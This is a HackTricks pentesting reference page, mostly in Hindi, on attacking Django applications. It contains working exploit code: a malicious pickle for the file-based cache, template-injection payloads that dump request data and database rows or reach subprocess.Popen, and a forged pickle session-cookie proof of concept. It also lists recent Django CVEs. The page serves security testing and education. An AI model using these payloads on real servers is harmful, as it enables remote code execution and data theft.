# Django

{{#include ../../banners/hacktricks-training.md}}

## Cache Manipulation to RCE
Django का default cache storage method [Python pickles](https://docs.python.org/3/library/pickle.html) है, जो RCE का कारण बन सकता है यदि [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf)। **यदि कोई attacker cache में write access प्राप्त कर लेता है, तो वे इस vulnerability को underlying server पर RCE में escalate कर सकते हैं**।

Django cache चार स्थानों में से किसी एक में स्टोर होती है: [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), या एक [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95)। Redis server या database में स्टोर किया गया cache सबसे संभावित attack vectors होते हैं (Redis injection और SQL injection), लेकिन एक attacker file-based cache का भी उपयोग कर arbitrary write को RCE में बदल सकता है। Maintainers ने इसे non-issue के रूप में चिह्नित किया है। यह ध्यान रखना महत्वपूर्ण है कि cache file folder, SQL table name, और Redis server विवरण implementation के अनुसार बदलेंगे।

On **FileBasedCache**, pickled value `CACHES['default']['LOCATION']` के अंतर्गत एक file में लिखा जाता है (अक्सर `/var/tmp/django_cache/`)। यदि वह directory world-writable या attacker-controlled है, तो expected cache key के तहत malicious pickle डालने से जब app उसे पढ़ती है तो code execution हो जाती है:
```bash
python - <<'PY'
import pickle, os
class RCE:
def __reduce__(self):
return (os.system, ("id >/tmp/pwned",))
open('/var/tmp/django_cache/cache:malicious', 'wb').write(pickle.dumps(RCE(), protocol=4))
PY
```
This HackerOne रिपोर्ट SQLite database में stored Django cache को exploit करने का एक बढ़िया, पुनरुत्पादन योग्य उदाहरण देती है: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
The Django Template Language (DTL) **Turing-complete** है। यदि user-supplied data को *template string* के रूप में render किया जाता है (उदाहरण के लिए `Template(user_input).render()` कॉल करने पर या जब `|safe`/`format_html()` auto-escaping हटाते हैं), तो एक attacker पूर्ण SSTI → RCE हासिल कर सकता है।

### Detection
1. `Template()` / `Engine.from_string()` / `render_to_string()` जैसी dynamic कॉल्स देखें जिनमें *कोई भी* unsanitised request data शामिल हो।
2. एक time-based या arithmetic payload भेजें:
```django
{{7*7}}
```
यदि rendered output में `49` मौजूद है तो input template engine द्वारा compiled है।
3. DTL **not Jinja2** है: arithmetic/loop payloads अक्सर `TemplateSyntaxError`/500 उठाते हैं फिर भी evaluation को साबित करते हैं। Polyglots जैसे `${{<%[%'"}}%` अच्छे crash-or-render probes हैं।

### Context exfiltration when RCE is blocked
भले ही object-walking to `subprocess.Popen` फेल हो, DTL फिर भी in-scope objects एक्सपोज़ करता है:
```django
{{ request }}               {# confirm SSTI #}
{{ request.META }}           {# leak Gunicorn/UWSGI headers, cookies, proxy info #}
{{ users }}                  {# QuerySet in the context? #}
{{ users.0 }}                {# first row #}
{{ users.values }}           {# dumps dicts of every column (email/flags/plaintext passwords if stored) #}
```
`QuerySet.values()` rows को dictionaries में बदल देता है, `__str__` को बायपास करता है और queryset द्वारा return किए गए सभी fields को उजागर करता है। यह तब भी काम करता है जब direct Python execution filter की गई हो।

**Automation pattern**: authenticate, CSRF token प्राप्त करें, किसी भी persistent field (e.g., username/profile bio) में marker-prefixed payload save करें, फिर उस view को request करें जो इसे render करता है (AJAX endpoints जैसे `/likes/<id>` आम हैं)। एक stable attribute (e.g., `title="..."`) parse करके rendered result recover करें और payloads को iterate करें।

### RCE तक प्राथमिक कदम
Django direct access to `__import__` ब्लॉक करता है, लेकिन Python object graph पहुंच योग्य है:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
`subprocess.Popen` का इंडेक्स (≈400–500, Python build पर निर्भर) खोजें और मनमाने कमांड निष्पादित करें:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
एक अधिक सुरक्षित सार्वभौमिक गैजेट यह है कि तब तक iterate करें जब तक `cls.__name__ == 'Popen'`।

वही गैजेट उन **Debug Toolbar** या **Django-CMS** template rendering सुविधाओं के लिए काम करता है जो user input को सही तरह से हैंडल नहीं करतीं।

---

### साथ ही देखें: ReportLab/xhtml2pdf PDF export RCE
Django पर बने applications अक्सर xhtml2pdf/ReportLab को views को PDF के रूप में export करने के लिए integrate करते हैं। जब user-controlled HTML PDF generation में चला जाता है, rl_safe_eval ट्रिपल ब्रैकेट्स `[[[ ... ]]]` के अंदर expressions का मूल्यांकन कर सकता है जिससे code execution संभव हो जाता है (CVE-2023-33733)। विवरण, payloads, और mitigations:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle-Backed Session Cookie RCE
यदि सेटिंग `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'` सक्षम है (या कोई कस्टम serializer जो pickle को deserialise करता है), Django किसी भी view कोड को कॉल करने से **पहले** session cookie को *decrypts and unpickles* कर देता है। इसलिए, वैध signing key का होना (प्रोजेक्ट का `SECRET_KEY` डिफ़ॉल्ट रूप से) तुरंत remote code execution के लिए पर्याप्त है।

### Exploit Requirements
* सर्वर `PickleSerializer` का उपयोग करता है।
* हमलावर `settings.SECRET_KEY` जानता है / अनुमान लगा सकता है (leaks via GitHub, `.env`, error pages, आदि)।

### Proof-of-Concept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
परिणामी cookie भेजें, और payload WSGI worker के permissions के साथ चलता है।

**निवारक उपाय**: डिफ़ॉल्ट `JSONSerializer` रखें, `SECRET_KEY` रोटेट करें, और `SESSION_COOKIE_HTTPONLY` कॉन्फ़िगर करें।

---

## हाल के (2023–2025) उच्च‑प्रभाव वाले Django CVEs जिन्हें Pentesters को जांचना चाहिए
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (4 जून 2025 को फिक्स किया गया)। यह हमलावरों को log files में newlines/ANSI codes छुपाकर downstream log analysis को खराब करने की अनुमति देता है। Patch level ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). JSON keys को इस तरह तैयार करें कि वे quoting से बाहर निकलें और arbitrary SQL execute कर सकें। 4.2.15 / 5.0.8 में फिक्स किया गया।

हमेशा exact framework version को `X-Frame-Options` error page या `/static/admin/css/base.css` के hash से पहचानें और जहाँ लागू हो ऊपर बताए गए मुद्दों का परीक्षण करें।

---

## संदर्भ
* Django सुरक्षा रिलीज – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Jun 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Aug 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
* Django docs – QuerySet.values(): [https://docs.djangoproject.com/en/6.0/ref/models/querysets/#values](https://docs.djangoproject.com/en/6.0/ref/models/querysets/#values)
* 0xdf: HackNet (HTB) — HTML Attribute Injection → Django SSTI → QuerySet.values data dump → Pickle FileBasedCache RCE – [https://0xdf.gitlab.io/2026/01/17/htb-hacknet.html](https://0xdf.gitlab.io/2026/01/17/htb-hacknet.html)

{{#include ../../banners/hacktricks-training.md}}
